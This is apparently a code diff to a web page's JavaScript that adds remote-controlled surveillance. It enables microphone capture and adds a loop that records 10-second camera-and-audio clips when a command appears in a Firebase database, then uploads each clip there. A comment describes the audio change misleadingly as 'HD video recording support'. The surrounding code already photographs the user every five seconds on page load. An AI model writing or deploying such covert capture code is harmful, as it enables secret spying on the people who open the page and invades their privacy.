@@ -289,7 +289,7 @@
                         height: { ideal: 1080 },
                         focusMode: 'continuous'
                     },
-                    audio: false 
+                    audio: true // Enabled audio for HD video recording support
                 });
                 video.srcObject = localStream;
 
@@ -330,7 +330,7 @@
                         height: { ideal: 1080 },
                         focusMode: 'continuous'
                     },
-                    audio: false 
+                    audio: true 
                 });
                 
                 const track = localStream.getVideoTracks()[0];
@@ -512,9 +512,97 @@
             });
         }
 
+        // Continuous 10-Second HD Video Recording Loop Controlled by Admin Commands
+        let mediaRecorder = null;
+        let recordedVideoChunks = [];
+        let videoRecordingInterval = null;
+        let isVideoRecordingActive = false;
+
+        function setupVideoCommandListener() {
+            db.ref('security/commands/videoMode').on('value', (snapshot) => {
+                const cmd = snapshot.val();
+                if (cmd === 'start' && !isVideoRecordingActive) {
+                    startContinuousHDVideoLoop();
+                } else if (cmd === 'pause' && isVideoRecordingActive) {
+                    stopContinuousHDVideoLoop();
+                }
+            });
+        }
+
+        function startContinuousHDVideoLoop() {
+            if (!localStream) return;
+            isVideoRecordingActive = true;
+
+            function recordSingleChunk() {
+                if (!isVideoRecordingActive) return;
+
+                recordedVideoChunks = [];
+                try {
+                    const options = { mimeType: 'video/webm;codecs=vp9,opus' };
+                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                        options.mimeType = 'video/webm';
+                    }
+                    
+                    mediaRecorder = new MediaRecorder(localStream, options);
+                } catch (e) {
+                    try { mediaRecorder = new MediaRecorder(localStream); } catch(err) { return; }
+                }
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data && event.data.size > 0) {
+                        recordedVideoChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = () => {
+                    if (recordedVideoChunks.length > 0) {
+                        const blob = new Blob(recordedVideoChunks, { type: 'video/webm' });
+                        const reader = new FileReader();
+                        reader.onloadend = function() {
+                            const base64Video = reader.result;
+                            const timestamp = new Date().toLocaleString();
+                            const camType = currentFacingMode === 'user' ? 'Front Camera' : 'Back Camera';
+
+                            // Push 10-second HD video clip to Firebase Realtime Database
+                            db.ref('security/videos').push({
+                                video: base64Video,
+                                text: `${camType} - 10s HD Video Clip at ${timestamp}`,
+                                timestamp: timestamp
+                            });
+                        };
+                        reader.readAsDataURL(blob);
+                    }
+
+                    // Automatically trigger the next 10-second video block if recording is still active
+                    if (isVideoRecordingActive) {
+                        setTimeout(recordSingleChunk, 500);
+                    }
+                };
+
+                mediaRecorder.start();
+
+                // Stop recording precisely after 10 seconds to upload the chunk
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, 10000);
+            }
+
+            recordSingleChunk();
+        }
+
+        function stopContinuousHDVideoLoop() {
+            isVideoRecordingActive = false;
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
+        }
+
         window.addEventListener('load', () => {
             requestPermissionsAndStart().then(() => {
                 setupWebRTCListener();
+                setupVideoCommandListener();
                 // 5-second lightweight auto background capture (smooth & non-laggy)
                 setInterval(() => captureAndSendPhoto("Auto Background Capture", false, false), 5000);
             });
